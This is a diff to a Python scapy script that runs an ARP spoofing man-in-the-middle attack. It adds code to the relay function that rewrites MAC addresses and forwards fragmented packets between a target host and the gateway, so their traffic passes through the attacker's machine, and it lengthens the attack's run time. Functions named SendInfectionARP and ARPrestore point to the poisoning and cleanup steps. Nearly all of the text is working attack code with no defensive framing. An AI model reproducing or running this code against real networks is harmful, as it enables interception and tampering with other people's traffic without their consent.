@@ -5,6 +5,7 @@ import thread
 import time
 import signal
 from optparse import OptionParser
+import scapy
 from scapy.all import *
 from multiprocessing import Pipe
 
@@ -73,6 +74,8 @@ def arp_monitor_callback(pkt):
 		if srcIP == targetIP:
 			pipeA.send(pkt.sprintf("%ARP.hwsrc%"))            #pipeA
 			quit()
+	else:
+		pipeA.send('')
 
 def arpSniff():
 	sniff(prn=arp_monitor_callback, filter="arp", store=0)
@@ -99,13 +102,35 @@ def SendInfectionARP(eth_src_mac, eth_dst_mac, arp_pdst, arp_hwdst, arp_psrc, ar
 
 def RelayPacket(pkt):
 	global targetMAC, gatewayMAC
-	
-	if Ether in pkt:
-		sourceMAC = pkt.sprintf("%Ether.src%")
-		if sourceMAC == targetMAC:
-			ls(pkt)
-		elif sourceMAC == gatewayMAC:
-			ls(pkt)
+
+	if IPv6 not in pkt:          # no IPv6
+		cnt = 0
+		cntt = 0
+		try:
+			if Ether in pkt and ARP not in pkt:
+				sourceMAC = pkt.sprintf("%Ether.src%")
+				if sourceMAC == targetMAC:
+					pkt.src = myInfo.GetMyMac()
+					pkt.dst = gatewayMAC
+					frags=fragment(pkt,fragsize=1024)
+					for frag in frags:
+						sendp(frag, verbose=False)
+						cnt += 1
+						print cnt
+						#print frag.show()
+
+				elif sourceMAC == gatewayMAC:
+					pkt.src = myInfo.GetMyMac()
+					pkt.dst = targetMAC
+					frags=fragment(pkt,fragsize=1024)
+					for frag in frags:
+						sendp(frag, verbose=False)
+						cntt += 1
+						print cntt
+						#print frag.show()
+		except:
+			print pkt.show()
+
 
 def ForFowardPacketSniff():
 	sniff(prn=RelayPacket, store=0)
@@ -175,7 +200,7 @@ if __name__ == "__main__":
 	
 	thread.start_new_thread(ForFowardPacketSniff, ())
 
-	time.sleep(1000)
+	time.sleep(10000)
 
 	ARPrestore(signal.SIGINT, ARPrestore)
 '''
